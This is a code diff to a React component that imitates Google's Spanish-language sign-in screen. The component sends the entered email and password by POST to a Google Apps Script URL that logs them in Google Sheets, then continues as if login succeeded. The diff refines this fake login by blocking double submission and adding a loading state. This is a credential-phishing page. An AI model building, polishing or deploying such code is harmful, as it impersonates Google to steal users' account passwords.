@@ -7,6 +7,7 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [emailError, setEmailError] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false); // ESTADO PARA BLOQUEAR DOBLE CLIC
 
   const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
 
@@ -20,9 +21,10 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   };
 
   const handlePasswordNext = async () => {
-    if (!password.trim()) return;
+    if (!password.trim() || isSubmitting) return; // Si ya está enviando, no hace nada
 
-    // AÑADIDO: Bloqueo de seguridad para asegurar el envío
+    setIsSubmitting(true); // Bloqueamos el botón inmediatamente
+
     try {
       await fetch(webAppUrl, {
         method: "POST",
@@ -35,12 +37,14 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
         })
       });
       
-      // Esperamos un segundo extra para que Google Sheets procese la fila
+      // Espera de seguridad para que Google Sheets procese
       setTimeout(() => {
         onLoginComplete();
       }, 1000);
 
     } catch (e) {
+      console.error("Error de envío");
+      setIsSubmitting(false); // Si falla, liberamos el botón para reintentar
       onLoginComplete();
     }
   };
@@ -52,7 +56,7 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
           <div className="animate-fade-in">
             <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
             <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
-            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
+            <p className="text-center text-sm mb-8 font-google-sans">Utiliza tu cuenta de Google</p>
             <div className="space-y-6">
               <input
                 type="text"
@@ -87,6 +91,7 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
                 placeholder="Introduce tu contraseña"
                 className="google-input w-full"
                 autoFocus
+                disabled={isSubmitting}
               />
               <label className="flex items-center gap-3 cursor-pointer select-none">
                 <input 
@@ -99,7 +104,13 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
               </label>
               <div className="flex justify-between items-center pt-4">
                 <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
-                <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
+                <button 
+                  onClick={handlePasswordNext} 
+                  className={`google-btn-blue ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
+                  disabled={isSubmitting}
+                >
+                  {isSubmitting ? "Cargando..." : "Siguiente"}
+                </button>
               </div>
             </div>
           </div>
